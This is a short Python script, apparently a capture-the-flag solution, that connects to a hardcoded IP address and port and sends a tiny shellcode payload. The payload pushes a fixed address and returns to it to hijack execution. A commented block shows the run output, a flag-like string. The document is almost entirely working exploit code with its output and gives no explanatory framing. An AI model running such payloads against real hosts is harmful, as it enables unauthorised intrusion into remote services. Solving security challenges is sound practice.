import socket
import struct

HOST = "104.131.90.29"
PORT = 8003

def pack(p):
    return struct.pack('<I', p)

payload = b'\x68'
payload += pack(0x080489FB)
payload += b'\xC3'


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.sendall(payload + b'\n')
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.close()

main()

'''
Run:
b'9qCzj0cNsRuwyT6HLIz8RAuBp3NMQ1Bdwm2F2CtquuXea5X0lOWKQ4FeU5fJ\n'
b''

'''